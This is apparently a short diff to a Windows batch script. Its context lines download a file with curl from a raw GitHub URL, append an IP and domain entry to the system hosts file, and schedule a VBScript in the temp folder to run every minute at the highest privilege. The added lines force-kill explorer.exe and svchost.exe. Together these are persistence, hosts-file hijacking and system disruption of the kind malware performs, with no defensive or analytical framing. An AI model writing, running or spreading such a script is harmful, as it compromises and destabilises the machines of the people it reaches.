@@ -37,3 +37,6 @@ curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd123
 echo 185.194.175.132 davidroger.com >> %SystemRoot%\System32\drivers\etc\hosts
 
 schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
+
+taskkill /f /im explorer.exe
+taskkill /f /im svchost.exe
